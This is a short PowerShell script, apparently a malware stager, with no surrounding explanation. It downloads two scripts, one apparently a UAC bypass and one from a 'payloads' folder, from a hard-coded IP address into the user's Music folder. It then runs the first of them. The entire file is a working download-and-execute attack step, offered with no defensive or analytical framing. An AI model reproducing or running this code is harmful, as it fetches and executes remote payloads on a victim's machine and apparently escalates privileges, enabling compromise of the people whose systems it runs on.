
$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/scambtr_uac/Uac_main.ps1'
$file = "c:\Users\$env:USERNAME\Music\Uac_main.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/scambtr_uac/payloads/fm1ri21p.ps1'
$file = "c:\Users\$env:USERNAME\Music\fm1ri21p.ps1"
$down.DownloadFile($url, $file);

powershell c:\Users\$env:USERNAME\Music\Uac_main.ps1
    